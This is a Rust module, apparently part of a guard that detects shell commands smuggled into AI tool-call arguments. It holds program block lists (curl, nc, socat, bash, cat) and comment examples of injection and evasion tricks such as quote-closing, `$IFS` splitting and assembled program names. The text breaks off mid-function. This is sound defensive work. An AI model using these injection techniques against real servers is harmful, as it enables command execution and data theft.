//! Commands chained onto the arguments of a tool that is not a shell.
//!
//! A server that builds a shell line out of an argument (`ping -c 1 {host}`,
//! a `subprocess` call with `shell=True`) runs every command the argument
//! adds to that line: after `;`, `&`, `&&`, `||`, `|` or a line break, in a
//! subshell or a brace group, or in a command substitution. This module reads
//! each string of a tool call's arguments as the shell reads it there and
//! judges each command it adds by what the command does: reads a file, runs
//! code, fetches or relays, changes owners, modes, mounts or processes, takes
//! privilege, or prints the environment.
//!
//! # Why the shell's words, not a pattern over the text
//!
//! Chaining was screened by regular expressions over the arguments as JSON
//! text, one program list per operator. The lists drifted apart (`;` knew
//! `cat`, `&&` did not), a line break was never seen (in JSON text it is two
//! characters, `\` and `n`, and so is a tab, which the shell takes as a
//! blank), and a program written with its folder (`/bin/cat`), in quotes
//! (`'cat'`, `c'a't`) or behind a wrapper (`nohup cat`) was missed. Here the
//! value is the decoded string the server receives, read by the same word
//! reader the shell hook uses.
//!
//! # Where the value sits on the server's line
//!
//! A server may put the value on its line bare, inside single quotes or
//! inside double quotes, and a value can close the quote it was put in
//! (`x' && cat f '`). Each value is read once per place, behind a fixed word
//! that stands for the server's own program and before the server's closing
//! quote, and a command found in any of the three readings counts. The first command of a reading is the server's
//! own; every later one, and every command of a substitution, is the value's.
//!
//! # Two kinds of operator
//!
//! `;`, `&&`, `||`, `|`, a parenthesis, a brace group and a substitution are
//! shell syntax that prose has little use for. After one of them a command
//! counts when it runs a program of [`PROGRAMS`] at all, a reader of
//! [`READERS`] handed an operand, a reader whose name is also an English word
//! ([`READER_WORDS`]: `sort of`, `more or less`) handed an operand that names
//! a file, or a program the line computes when it runs and hands something.
//!
//! A line break and a lone `&` are also how notes, messages, scripts and
//! documents break a line (`cat food` on a shopping list) or join two words
//! (`dog & cat`). After one of them a command counts only for what it is
//! handed: a path from the root, a home or a parent folder, a file read on
//! its input, code to run (`-c`, `-e`, `-i`), or nothing at all when it
//! prints the environment; and only as the shell spells it (`Python 3.12` at
//! the start of a line is prose). A relative path is left out there, since a
//! script or a Makefile written through a file tool says `rm -rf bin`.
//!
//! Whatever the operator, a file read on a command's input (`< /path`) counts
//! whichever program reads it, the shell's own `read` included.
//!
//! # A program the guard cannot name
//!
//! The program can come from the line itself: a substitution (`$(...)`), two
//! parameters joined, an expansion other than a plain parameter. Such a
//! program is refused once it is handed something, since the guard cannot
//! tell which program it is; one bare parameter (`$a && $b` in code) only for
//! a path. A parameter the value assigns is followed (`A=ca; B=t; $A$B`). An
//! unquoted parameter glued to a program's name (`cat$IFS/path`) may split
//! the word in two, so the name in front of it is a program and the rest its
//! operand.
//!
//! # What is not a chained command
//!
//! A parenthesis or a `{` where no command can start is not an operator to
//! the shell (`pets (cat videos)` is a syntax error, `const { id } = x`
//! passes `{` as a word), so neither ends a command here; a command can still
//! start after an operator or a reserved word, which is all a subshell or a
//! brace group needs. A `NAME=value` word assigns and runs nothing, which is
//! what a URL query string is to the shell (`?page=2&id=17`). Prose (`R&D`,
//! `Tom && Jerry`) and code (`a && b`) name no program of the lists. Four of
//! those programs are also common words of code and are judged by what the
//! shell would make them do with the words they got: `export`, `declare` and
//! `set` print the environment only with no name to act on (`export default
//! App` names one), `id` prints nothing once it has more than one operand or
//! is handed `=` (`id = 5`), and `env`, `exec` and the other wrappers are
//! judged by the program they start (`env = os.environ` starts a program
//! named `=`), `env` alone printing the environment. A quote or a
//! substitution that never closes makes the shell refuse the line, so it runs
//! nothing (a lone `` ```bash `` line). A glob without a folder names a file
//! in the server's working directory, not a program the value chose (`*
//! item`). A builtin is matched only as the shell spells it (`Set` is no
//! command), a program on the path in any case after a tight operator.
//!
//! # What is left
//!
//! A program none of the lists names, handed a file after any operator, and
//! a relative path handed to a reader after a line break or a lone `&`, are
//! not refused here: the first is open-ended, the second is what a line of a
//! script or a note looks like.
//!
//! Measured on 2026-11-14 on a Rocky 9 host. Of 289,937 lines of
//! documentation (Python's library, `/usr/share/doc`, npm's modules, this
//! repository's docs) each sent as a one-line argument, 523 read as a
//! chained command and 59 of them are not already refused by another rule
//! (60 for the first cut of this check, which knew a short program list and
//! read every operator alike). Of 3,635 whole files sent as a file tool's
//! content (Python, JavaScript, JSON, Markdown, READMEs, 303 shell scripts,
//! Makefiles), 21 are refused by this check alone (74 for the first cut).
//! Most of both are a shell command quoted in prose (`` `openssl x509` ``),
//! which runs when a shell gets it.

use std::collections::{HashMap, HashSet};

use crate::shell_words::{read_line, Command, Joint, Line, Mark, Word};

/// Programs a chained command is refused for after a tight operator whatever
/// it hands them: the list ATR-2026-111 uses inside `$(...)`, the widest the
/// rule has, plus the shells and the relay it left out. Readers of files are
/// in [`READERS`] and [`READER_WORDS`].
///
/// Kept by hand, not read from `data/programs.toml`, and on purpose: this
/// check reads prose (a tool's argument, a whole file sent as content), and
/// the false-positive counts in this module's header were measured with
/// these lists. The table holds names that are English words or prose
/// (`fish`, `ash`, `at`, `batch`, `make`, `find`, `watch`, `source`,
/// `.`), which here would be read as programs in sentences. A name moves
/// here only with a new measure of those counts.
const PROGRAMS: &[&str] = &[
    "rm", "curl", "wget", "nc", "ncat", "bash", "sh", "python", "perl", "ruby", "php", "whoami",
    "id", "uname", "env", "printenv", "set", "export", "declare", "typeset", "eval", "exec",
    "chmod", "chown", "kill", "pkill", "dd", "mkfs", "mount", "umount", "sudo", "su", "passwd",
    "openssl", "zsh", "ksh", "dash", "socat",
];

/// Programs that print, copy or run a file they are named: refused after a
/// tight operator once they get an operand. Given none, they read their input,
/// which on a server's line is the output of the server's own program.
const READERS: &[&str] = &[
    "cat", "tac", "nl", "od", "xxd", "hexdump", "hd", "strings", "base64", "base32", "basenc",
    "uuencode", "sed", "awk", "gawk", "mawk", "nawk", "grep", "egrep", "fgrep", "zgrep", "rg",
    "ag", "ack", "zcat", "bzcat", "xzcat", "zstdcat", "lzcat", "jq", "yq", "xmllint", "iconv",
    "uniq", "rev", "tee", "vi", "vim", "nvim", "nano", "emacs", "sqlite3", "node", "nodejs",
    "deno", "bun", "lua", "luajit", "tclsh", "pwsh",
];

/// Readers whose first operand is a pattern or a program, not a file
/// (`| grep word` reads its input): they read a file from their second.
const PATTERN_FIRST: &[&str] = &[
    "sed", "awk", "gawk", "mawk", "nawk", "grep", "egrep", "fgrep", "zgrep", "rg", "ag", "ack",
    "jq", "yq",
];

/// Readers whose names are also words of English prose (`sort of`, `more or
/// less`), and `.`, which ends a sentence after a parenthesis (`(if any).
/// To get`): refused after a tight operator only for an operand that names
/// a file (a folder, a home, an extension) or a computed one.
const READER_WORDS: &[&str] = &[
    ".", "head", "tail", "more", "less", "most", "sort", "cut", "paste", "join", "split", "csplit",
    "fold", "fmt", "pr", "expand", "unexpand", "column", "comm", "diff", "cmp", "look", "cp", "mv",
    "install", "source", "shuf",
];

/// Interpreters and shells: after a loose operator they count when told to
/// run code given on the line (`-c`, `-e`) or to stay interactive (`-i`).
/// Kept by hand for the reason given at [`PROGRAMS`]; `tclsh` and `pwsh`
/// are here and not in the table, which reads only what the shell reader
/// follows.
const INTERPRETERS: &[&str] = &[
    "bash", "sh", "zsh", "ksh", "dash", "python", "perl", "ruby", "php", "node", "nodejs", "lua",
    "tclsh", "pwsh",
];

/// Programs that print the environment or the server's user with nothing to
/// act on, counted after a loose operator too (`env`, `set`, `export`,
/// `declare`, `typeset` and `id` are judged by their own operands).
const DISCLOSERS: &[&str] = &["printenv", "whoami"];

/// Programs that run another program named among their operands: judged by
/// that program.
const WRAPPERS: &[&str] = &[
    "command", "builtin", "exec", "env", "nohup", "nice", "time", "timeout", "stdbuf", "setsid",
    "busybox", "toybox", "xargs", "doas", "ionice", "chrt", "taskset", "unbuffer", "coproc",
];

/// Words that open or continue a compound command: the command proper starts
/// after them.
const RESERVED: &[&str] = &[
    "!", "if", "then", "else", "elif", "while", "until", "do", "{", "}",
];

/// How deep substitutions, `eval` strings and wrappers are followed. Deeper
/// than this, the value is refused: a check that cannot finish must not pass.
const DEPTH: u8 = 8;

/// What a chained command was found to do.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum Chained {
    /// It runs this program.
    Runs(&'static str),
    /// It reads a file on its input (`< /path`), or it is a substitution
    /// that only redirects a file into itself (`$(<file)`): bash reads the
    /// file into the line without running a program.
    ReadsFile,
    /// Its program is computed when the line runs (a substitution, or
    /// parameters the value does not assign), and it is handed what the
    /// value names: the guard cannot tell which program that is.
    Computed,
    /// Its substitutions or wrappers nest deeper than [`DEPTH`].
    TooDeep,
}

impl Chained {
    /// The reason a refusal gives.
    pub(crate) fn describe(self, argument: &str) -> String {
        // The place is shown, and a key can be the carrier itself: no
        // control character, and no more than a short label.
        let argument: String = argument
            .chars()
            .map(|c| if c.is_control() { ' ' } else { c })
            .take(64)
            .collect();
        match self {
            Chained::Runs(program) => format!(
                "argument `{argument}` adds a command to a shell line that runs `{program}`"
            ),
            Chained::ReadsFile => {
                format!("argument `{argument}` adds a command to a shell line that reads a file")
            }
            Chained::Computed => format!(
                "argument `{argument}` adds a command to a shell line whose program is computed when it runs"
            ),
            Chained::TooDeep => format!(
                "argument `{argument}` nests commands deeper than the guard reads ({DEPTH} levels)"
            ),
        }
    }
}

/// The first string in `args`, a key or a value at any depth, that carries a
/// chained command, with where it sits (`host`, `targets.hosts[1]`).
pub(crate) fn chained_argument(args: &serde_json::Value) -> Option<(String, Chained)> {
    fn walk(value: &serde_json::Value, at: &str) -> Option<(String, Chained)> {
        match value {
            serde_json::Value::String(text) => {
                chained_command(text).map(|found| (at.to_string(), found))
            }
            serde_json::Value::Array(items) => items
                .iter()
                .enumerate()
                .find_map(|(index, item)| walk(item, &format!("{at}[{index}]"))),
            serde_json::Value::Object(map) => map.iter().find_map(|(key, item)| {
                let here = if at.is_empty() {
                    key.clone()
                } else {
                    format!("{at}.{key}")
                };
                chained_command(key)
                    .map(|found| (here.clone(), found))
                    .or_else(|| walk(item, &here))
            }),
            _ => None,
        }
    }
    walk(args, "")
}

/// What a command chained onto `value` runs, read as the shell reads the
/// value on a server's line, bare or inside either quote.
pub(crate) fn chained_command(value: &str) -> Option<Chained> {
    if !value.contains([';', '&', '|', '\n', '\r', '(', '`']) {
        return None;
    }
    let text = prepare(value);
    ["", "'", "\""].into_iter().find_map(|open| {
        // The server's own quote closes after the value.
        let reading = format!("x{open}{text}{open}");
        let line = read_line(&reading);
        let assigned = assignments(&line);
        line.commands
            .iter()
            .skip(1)
            .find_map(|command| judge(command, tier_of(command), &assigned, 0))
            .or_else(|| nested(&line, &reading, 0))
    })
}

/// `value` with a carriage return read as a line break (a server that splits
/// lines may split on it), and each `(` and lone `{` made a blank. Where one
/// opens a subshell or a group, the operator or reserved word in front of it
/// already starts the command; anywhere else the shell refuses a `(` and
/// takes a `{` as a plain word, so neither may end a command there. A `(`
/// after `$`, `<`, `>` or `=` opens a substitution or an array and is kept,
/// and so is `${`.
fn prepare(value: &str) -> String {
    let mut out = String::with_capacity(value.len());
    let mut chars = value.chars().peekable();
    let mut previous = None;
    while let Some(c) = chars.next() {
        let next = chars.peek().copied();
        let kept = match c {
            '\r' => '\n',
            '(' if !matches!(previous, Some('$' | '<' | '>' | '=' | '(')) => ' ',
            '{' if previous != Some('$') && next.is_none_or(char::is_whitespace) => ' ',
            other => other,
        };
        out.push(kept);
        previous = Some(kept);
    }
    out
}

/// Every command of every substitution in `line`, the first of each
/// included: a substitution is a command line of its own.
fn nested(line: &Line, text: &str, depth: u8) -> Option<Chained> {
    let mut seen = HashSet::new();
    let mut run_by_name = None;
    for inner in &line.nested {
        if !seen.insert(inner.as_str()) {
            continue;
        }
        if depth >= DEPTH {
            return Some(Chained::TooDeep);
        }
        let read = read_line(inner);
        let assigned = assignments(&read);
        let file_read = reads_a_file(inner);
        let found = read
            .commands
            .iter()
            .find_map(|command| judge(command, Tier::Tight, &assigned, depth + 1))
            .or(file_read.then_some(Chained::ReadsFile));
        // The reader hands back the inside of `${...}` with the command
        // lines: a bare name no command substitution of `text` holds is a
        // parameter (`${id}` in a template), not `$(id)`.
        let parameter = is_name(inner)
            && !run_by_name
                .get_or_insert_with(|| substituted_names(text))
                .contains(inner.as_str());
        if found.is_some() && !parameter && !never_closed(inner, text) {
            return found;
        }
        if let Some(found) = nested(&read, inner, depth + 1) {
            return Some(found);
        }
    }
    None
}

/// `inner`, a substitution's line, is one input redirection of a file and
/// nothing else (`</etc/hosts`, `<.env`): bash puts the file's text in its
/// place. A tag in a code span (`<br>`) is a redirection without a target,
/// which the shell refuses, and an operator in one (`<=version`, `<!`) names
/// no path.
fn reads_a_file(inner: &str) -> bool {
    let Some(target) = inner.trim().strip_prefix('<') else {
        return false;
    };
    let target = target.trim_start();
    let names_a_path = target
        .starts_with(|c: char| c.is_ascii_alphabetic() || "/~._$'\"".contains(c))
        && target.contains(['/', '.']);
    if !names_a_path || target.contains(['<', '>', '|', ';', '&']) {
        return false;
    }
    let read = read_line(target);
    read.commands.len() == 1 && read.commands[0].words.len() == 1
}

/// The bare names `text` runs as a command substitution: `$(name)`,
/// `` `name` ``, `<(name)`, `>(name)`. One pass over `text`.
fn substituted_names(text: &str) -> HashSet<&str> {
    let bytes = text.as_bytes();
    let mut names = HashSet::new();
    let mut at = 0;
    while at < bytes.len() {
        let (start, close) = match (bytes[at], bytes.get(at + 1)) {
            (b'$' | b'<' | b'>', Some(b'(')) => (at + 2, b')'),
            (b'`', _) => (at + 1, b'`'),
            _ => {
                at += 1;
                continue;
            }
        };
        let end = start
            + bytes[start..]
                .iter()
                .take_while(|b| b.is_ascii_alphanumeric() || **b == b'_')
                .count();
        if end > start && bytes.get(end) == Some(&close) {
            names.insert(&text[start..end]);
        }
        at = start;
    }
    names
}

/// `inner` is a substitution of `text` that never closes: it runs from its
/// opening to the end of `text` (`` ```bash `` alone on a line). The shell
/// refuses such a line before running any of it.
fn never_closed(inner: &str, text: &str) -> bool {
    ["`", "$(", "<(", ">("]
        .iter()
        .any(|open| text.ends_with(&format!("{open}{inner}")))
}

/// How much a command's position says about it.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Tier {
    /// After `;`, `&&`, `||`, `|` or a brace or parenthesis, or inside a
    /// substitution: shell syntax, which prose has little use for.
    Tight,
    /// After a line break or a lone `&`: how notes, messages, scripts and
    /// documents break a line (`cat food` on a shopping list) or join two
    /// words (`dog & cat`). A command there counts only for what it is
    /// handed: a path from the root, a home or a parent folder, a file read
    /// on its input, code to run, or nothing at all when it prints the
    /// environment.
    Loose,
}

fn tier_of(command: &Command) -> Tier {
    match command.after {
        Joint::Loose => Tier::Loose,
        Joint::Start | Joint::Tight => Tier::Tight,
    }
}

/// What `command`, a simple command at `tier`, does that a value has no
/// business adding to a server's line: a file it reads on its input, else
/// what its program does with its words.
fn judge(
    command: &Command,
    tier: Tier,
    assigned: &HashMap<String, String>,
    depth: u8,
) -> Option<Chained> {
    // A file read on the input is a file read whatever the program, the
    // shell's own `read` included (`read l < /path`), and wherever the
    // redirection is written (`done < /path` after a loop).
    if command
        .reads
        .iter()
        .any(|target| names_a_place(&target.text) && !closes_a_tag(&target.text))
    {
        return Some(Chained::ReadsFile);
    }
    runs(&command.words, tier, assigned, depth)
}

/// `target`, read after a `<`, is the rest of an HTML closing tag (`</td>`
/// in a table cell, `</span>`): a file of that name at the root of the
/// server's disk is no file a value would read.
fn closes_a_tag(target: &str) -> bool {
    const TAGS: &str =
        "a abbr b big blockquote body br button center cite code dd del details dfn \
         div dl dt em figcaption figure font footer form h1 h2 h3 h4 h5 h6 head \
         header html i ins kbd label li main mark nav ol option p pre q s samp script \
         section select small span strong style sub summary sup table tbody td tfoot \
         th thead title tr tt u ul var";
    target.strip_prefix('/').is_some_and(|tag| {
        TAGS.split_whitespace()
            .any(|known| known.eq_ignore_ascii_case(tag))
    })
}

/// What `words`, a simple command at `tier`, runs that counts: past the
/// assignments and the reserved words in front of it, and through the
/// wrappers.
fn runs(
    words: &[Word],
    tier: Tier,
    assigned: &HashMap<String, String>,
    depth: u8,
) -> Option<Chained> {
    if depth > DEPTH {
        return Some(Chained::TooDeep);
    }
    let mut at = 0;
    while let Some(word) = words.get(at) {
        if is_assignment(word) || RESERVED.contains(&word.text.as_str()) {
            at += 1;
        } else if word.text == "function" {
            // `function name { ...`: the name is not a program.
            at += 2;
        } else {
            break;
        }
    }
    let (first, operands) = words.get(at..)?.split_first()?;
    match head_of(first, assigned) {
        Head::Other => None,
        Head::Computed { bare, glued } => {
            // A program the line computes is refused when it is handed
            // something: after a tight operator any operand, or text glued
            // to it, unless it is one bare parameter (`$a && $b` in code);
            // a bare one, or any after a loose operator, for a path.
            let named = glued.as_deref().is_some_and(names_a_place)
                || operands.iter().any(|word| names_a_place(&word.text));
            let handed = glued.is_some() || !operands.is_empty();
            let counts = match tier {
                Tier::Tight if !bare => handed,
                _ => named,
            };
            counts.then_some(Chained::Computed)
        }
        Head::Known { name, exact, glued } => program(
            name,
            exact,
            glued.as_deref(),
            operands,
            tier,
            assigned,
            depth,
        ),
    }
}

/// What `name`, written as the shell spells it when `exact`, does with
/// `operands` and the text `glued` to it past a field split.
fn program(
    name: &'static str,
    exact: bool,
    glued: Option<&str>,
    operands: &[Word],
    tier: Tier,
    assigned: &HashMap<String, String>,
    depth: u8,
) -> Option<Chained> {
    // A server on a case-insensitive file system finds `CAT`, but prose
    // starts a line with a capital (`Cat food`, `Python 3.12`): after a
    // loose operator only the spelling the shell uses counts.
    if tier == Tier::Loose && !exact {
        return None;
    }
    let options_only = glued.is_none() && operands.iter().all(|word| word.text.starts_with('-'));
    match name {
        // `declare -f` prints functions, not the environment.
        "declare" | "typeset"
            if operands
                .iter()
                .any(|word| matches!(word.text.as_str(), "-f" | "-F")) =>
        {
            None
        }
        "export" | "declare" | "typeset" => options_only.then_some(Chained::Runs(name)),
        "set" => (glued.is_none() && operands.is_empty()).then_some(Chained::Runs("set")),
        "id" => {
            let named: Vec<&Word> = operands
                .iter()
                .filter(|word| !word.text.starts_with('-'))
                .collect();
            // `id root` after a tight operator; after a loose one a record
            // (`id 4471`) is no command.
            let most = if tier == Tier::Tight { 1 } else { 0 };
            let fails = glued.is_some()
                || named.len() > most
                || named.first().is_some_and(|word| is_operator(&word.text));
            (!fails).then_some(Chained::Runs("id"))
        }
        "eval" => {
            if depth >= DEPTH {
                return Some(Chained::TooDeep);
            }
            let joined: Vec<&str> = operands.iter().map(|word| word.text.as_str()).collect();
            let read = read_line(&prepare(&joined.join(" ")));
            let inner = assignments(&read);
            read.commands
                .iter()
                .find_map(|command| judge(command, Tier::Tight, &inner, depth + 1))
                .or_else(|| nested(&read, &joined.join(" "), depth + 1))
        }
        "env" => match wrapped(operands, tier, assigned, depth) {
            Some(found) => found,
            // Nothing to run: `env` prints the environment.
            None => Some(Chained::Runs("env")),
        },
        "sudo" | "su" if tier == Tier::Tight => Some(Chained::Runs(name)),
        wrapper if WRAPPERS.contains(&wrapper) => {
            wrapped(operands, tier, assigned, depth).flatten()
        }
        _ => {
            let named_operands = operands
                .iter()
                .filter(|word| !word.text.starts_with('-'))
                .count()
                + usize::from(glued.is_some());
            let handed = named_operands > usize::from(PATTERN_FIRST.contains(&name));
            let names_file = glued.is_some_and(names_a_file)
                || operands
                    .iter()
                    .any(|word| word.text.starts_with('$') || names_a_file(&word.text));
            let named = glued.is_some_and(names_a_place)
                || operands.iter().any(|word| names_a_place(&word.text));
            let counts = match tier {
                Tier::Tight if READERS.contains(&name) => handed,
                Tier::Tight if READER_WORDS.contains(&name) => names_file,
                Tier::Tight => PROGRAMS.contains(&name),
                Tier::Loose => {
                    named
                        || (DISCLOSERS.contains(&name) && options_only)
                        || (INTERPRETERS.contains(&name) && runs_given_code(operands))
                }
            };
            counts.then_some(Chained::Runs(name))
        }
    }
}

/// An interpreter's `operands` tell it to run code given on the line or to
/// stay interactive: `-c`, `-e`, `-i` alone or in a cluster of letters.
fn runs_given_code(operands: &[Word]) -> bool {
    operands.iter().any(|word| {
        let text = word.text.as_str();
        match text.strip_prefix("--") {
            Some(long) => matches!(long, "command" | "eval" | "interactive"),
            None => text.strip_prefix('-').is_some_and(|short| {
                short.contains(['c', 'e', 'i', 'r'])
                    && short.chars().all(|c| c.is_ascii_alphabetic())
            }),
        }
    })
}

/// `text` names a place on the server from somewhere the value chose: the
/// root, a home, a parent folder, or a parameter's folder (`$HOME/x`), alone
/// or as an option's value (`--data=@/path`, `-o/path`). A path relative to
/// the server's folder is left out: scripts and Makefiles write `rm -rf bin`.
fn names_a_place(text: &str) -> bool {
    let from_here = |text: &str| {
        text.starts_with('/')
            || text.starts_with('~')
            || text.starts_with("../")
            || (text.starts_with('$') && text.contains('/'))
    };
    from_here(text)
        || text
            .match_indices(['=', '@'])
            .any(|(at, _)| from_here(&text[at + 1..]))
}

/// `text` names a file a program would open: a place ([`names_a_place`]), a
/// path through a folder, or a name with an extension (`notes.txt`).
fn names_a_file(text: &str) -> bool {
    if names_a_place(text) || text.contains('/') {
        return true;
    }
    text.rsplit_once('.').is_some_and(|(stem, extension)| {
        !stem.is_empty()
            && (1..=5).contains(&extension.len())
            && extension.chars().all(|c| c.is_ascii_alphanumeric())
    })
}

/// What a wrapper given `operands` runs: `None` when it is given no program,
/// `Some(None)` when the program it runs does not count.
///
/// Options are passed over. A word right after an option may be that option's
/// value (`timeout -s KILL`, `env -u NAME`), so it is judged as a program and,
/// when it is not one, passed over too. Numbers and durations (`nice -n 5`,
/// `timeout 5s`) and assignments (`env A=1`) are passed over.
fn wrapped(
    operands: &[Word],
    tier: Tier,
    assigned: &HashMap<String, String>,
    depth: u8,
) -> Option<Option<Chained>> {
    let mut after_option = false;
    for (index, word) in operands.iter().enumerate() {
        let text = word.text.as_str();
        if text == "--" {
            return Some(runs(&operands[index + 1..], tier, assigned, depth + 1));
        }
        if text.len() > 1 && text.starts_with('-') {
            after_option = true;
            continue;
        }
        if is_assignment(word) || is_duration(text) {
            continue;
        }
        let found = runs(&operands[index..], tier, assigned, depth + 1);
        if !after_option || found.is_some() {
            return Some(found);
        }
        after_option = false;
    }
    None
}

/// What a command word names.
#[derive(Debug, PartialEq, Eq)]
enum Head {
    /// An entry of the lists, `exact` when written as the shell spells it,
    /// with the text a field split leaves glued after it (`cat$IFS/path`).
    Known {
        name: &'static str,
        exact: bool,
        glued: Option<String>,
    },
    /// A program the line computes when it runs: a substitution, an
    /// expansion other than a plain parameter, or parameters the value does
    /// not assign with no name of their own around them. `bare` when it is
    /// one parameter and nothing else.
    Computed { bare: bool, glued: Option<String> },
    /// Anything else: a word of prose or code.
    Other,
}

/// One piece of a command word.
enum Piece {
    /// Text handed on as written (glob and brace characters included).
    Text(String),
    /// `$name` or `${name}`.
    Parameter(String),
    /// Any other expansion: a substitution, `${name:0:1}`, `$1`, `$@`.
    Expansion,
}

/// The pieces of `word`, `None` when a quote in it never closes: the shell
/// refuses that line before running any of it.
fn pieces(word: &Word) -> Option<Vec<Piece>> {
    let chars: Vec<char> = word.text.chars().collect();
    let mut out = Vec::new();
    let mut at = 0;
    while at < chars.len() {
        let expansion = word.marks[at] == Mark::Expansion;
        let end = (at..chars.len())
            .find(|index| (word.marks[*index] == Mark::Expansion) != expansion)
            .unwrap_or(chars.len());
        let run: String = chars[at..end].iter().collect();
        if !expansion {
            out.push(Piece::Text(run));
        } else {
            if !run.starts_with(['$', '`']) {
                return None;
            }
            let mut rest = run.as_str();
            while !rest.is_empty() {
                let (piece, used) = parameter_at(rest);
                // A substitution whose line is one plain word (`` `key` ``
                // in a code span, `$(pwd)`) prints what that program prints,
                // which the value cannot steer to a program's name: an
                // unknown, like a parameter the value does not assign.
                let piece = match piece {
                    Piece::Expansion
                        if rest.starts_with(['`', '$'])
                            && !rest.starts_with("${")
                            && !word.substitutions.is_empty()
                            && word.substitutions.iter().all(|inner| one_plain_word(inner)) =>
                    {
                        Piece::Parameter(String::new())
                    }
                    other => other,
                };
                out.push(piece);
                rest = &rest[used..];
            }
        }
        at = end;
    }
    Some(out)
}

/// `line` is one word the shell takes as written and nothing else.
fn one_plain_word(line: &str) -> bool {
    let read = read_line(line);
    read.nested.is_empty()
        && read.commands.len() == 1
        && read.commands[0].words.len() == 1
        && read.commands[0].reads.is_empty()
        && read.commands[0].words[0].is_plain()
}

/// The piece at the start of `run`, a run of expansion text, and its length.
fn parameter_at(run: &str) -> (Piece, usize) {
    if let Some(after) = run.strip_prefix("${") {
        if let Some(close) = after.find('}') {
            let inner = &after[..close];
            if is_name(inner) {
                return (Piece::Parameter(inner.to_string()), close + 3);
            }
        }
    } else if let Some(after) = run.strip_prefix('$') {
        let length = after
            .chars()
            .take_while(|c| *c == '_' || c.is_ascii_alphanumeric())
            .count();
        if length > 0 && is_name(&after[..length]) {
            return (Piece::Parameter(after[..length].to_string()), length + 1);
        }
        // A positional or special parameter (`$1`, `$@`, `$$`): a value of
        // the server's own shell, never assigned by the value, like a name
        // it does not assign.
        if let Some(c) = after
            .chars()
            .next()
            .filter(|c| c.is_ascii_digit() || "@*#?$!-".contains(*c))
        {
            return (Piece::Parameter(c.to_string()), 2);
        }
    }
    // Anything else runs to the end of the expansion: the program it gives
    // is not one the guard can read.
    (Piece::Expansion, run.len())
}

/// The last folder component of `text`.
fn last_component(text: &str) -> &str {
    text.rsplit('/').next().unwrap_or(text)
}

/// What `word`, a command word, names. A word with no expansion is matched
/// as written: a glob as the shell would match it (`/bin/c?t`), a brace by
/// its first alternative. A parameter the line assigns is replaced by its
/// value (`A=ca; B=t; $A$B`). Past a parameter the value does not assign,
/// the shell may split the word in two (`$IFS`), so the text in front of it
/// is a program of its own; the text the line shows with the parameter left
/// out is one too (`c${u}at`). What none of those names, the line computes.
fn head_of(word: &Word, assigned: &HashMap<String, String>) -> Head {
    let known_here = |text: &str, glued: Option<String>| {
        let name = last_component(text);
        known(name).map(|entry| Head::Known {
            name: entry,
            exact: !name.chars().any(|c| c.is_ascii_uppercase()),
            glued,
        })
    };
    if !word.has(Mark::Expansion) {
        return match plain_name(word) {
            Some((name, exact)) => Head::Known {
                name,
                exact,
                glued: brace_rest(word),
            },
            None => Head::Other,
        };
    }
    let Some(pieces) = pieces(word) else {
        return Head::Other;
    };
    let mut resolved = String::new();
    let mut shown = String::new();
    let mut first_open: Option<usize> = None;
    let mut computed = false;
    let mut parameters = 0;
    for (index, piece) in pieces.iter().enumerate() {
        match piece {
            Piece::Text(text) => {
                if first_open.is_none() {
                    resolved.push_str(text);
                }
                shown.push_str(text);
            }
            Piece::Parameter(name) => match assigned.get(name) {
                Some(value) if first_open.is_none() => {
                    resolved.push_str(value);
                    shown.push_str(value);
                }
                Some(value) => shown.push_str(value),
                None => {
                    parameters += 1;
                    first_open.get_or_insert(index);
                }
            },
            Piece::Expansion => {
                computed = true;
                first_open.get_or_insert(index);
            }
        }
    }
    let Some(open) = first_open else {
        return known_here(&resolved, None).unwrap_or(Head::Other);
    };
    let after: String = pieces[open + 1..]
        .iter()
        .map(|piece| match piece {
            Piece::Text(text) => text.as_str(),
            Piece::Parameter(_) | Piece::Expansion => "$",
        })
        .collect();
    let glued = (!after.is_empty()).then_some(after);
    if !resolved.is_empty() {
        if let Some(found) = known_here(&resolved, glued.clone()) {
            return found;
        }
    }
    if !computed {
        if let Some(found) = known_here(&shown, None) {
            return found;
        }
    }
    let has_text = pieces
        .iter()
        .any(|piece| matches!(piece, Piece::Text(text) if !text.is_empty()));
    // Text a program's name cannot hold around the expansion (`[`, `,`, a
    // quote mark left as written) names no program: a code span in a table
    // cell or a sentence.
    let nameable = pieces.iter().all(|piece| match piece {
        Piece::Text(text) => text
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || "_./+-~".contains(c)),
        Piece::Parameter(_) | Piece::Expansion => true,
    });
    if nameable && (computed || (!has_text && parameters > 0)) {
        Head::Computed {
            bare: !computed && parameters == 1 && pieces.len() == 1,
            glued,
        }
    } else {
        Head::Other
    }
}

/// The entry a word with no expansion names, and whether it is written as
/// the shell spells it: its last path component, quotes and escapes taken
/// out, a glob matched as the shell would match it (`/bin/c?t`), a brace by
/// its first alternative.
fn plain_name(word: &Word) -> Option<(&'static str, bool)> {
    let (chars, marks) = first_alternative(word);
    let start = chars
        .iter()
        .zip(&marks)
        .rposition(|(c, mark)| *c == '/' && *mark == Mark::Plain)
        .map_or(0, |at| at + 1);
    let (chars, marks) = (&chars[start..], &marks[start..]);
    if marks.contains(&Mark::Pattern) {
        // Without a folder the shell matches the glob against the server's
        // working directory, not the programs on its path, so the value
        // cannot pick the program (`* item`, `/* note */` run no program the
        // value chose). With one, the name must keep two letters of its own:
        // `/bin/c*` runs whichever file sorts first, `/bin/c?t` runs `cat`.
        let literal = marks.iter().filter(|mark| **mark == Mark::Plain).count();
        if start == 0 || literal < 2 {
            return None;
        }
        return every_entry()
            .find(|name| glob_matches(chars, marks, &name.chars().collect::<Vec<_>>()))
            .map(|name| (name, true));
    }
    let plain: String = chars
        .iter()
        .zip(marks)
        .filter(|(_, mark)| **mark == Mark::Plain)
        .map(|(c, _)| *c)
        .collect();
    known(&plain).map(|name| (name, !plain.chars().any(|c| c.is_ascii_uppercase())))
}

/// The words a brace list adds after its first alternative, which the
/// program gets as operands (`{cat,/path}`), as one text.
fn brace_rest(word: &Word) -> Option<String> {
    let comma = word
        .text
        .chars()
        .zip(&word.marks)
        .position(|(c, mark)| c == ',' && *mark == Mark::Pattern)?;
    Some(
        word.text
            .chars()
            .zip(&word.marks)
            .skip(comma + 1)
            .filter(|(c, mark)| !(**mark == Mark::Pattern && matches!(c, '{' | '}' | ',')))
            .map(|(c, _)| c)
            .collect(),
    )
}

/// Every program the lists name.
fn every_entry() -> impl Iterator<Item = &'static str> {
    PROGRAMS
        .iter()
        .chain(READERS)
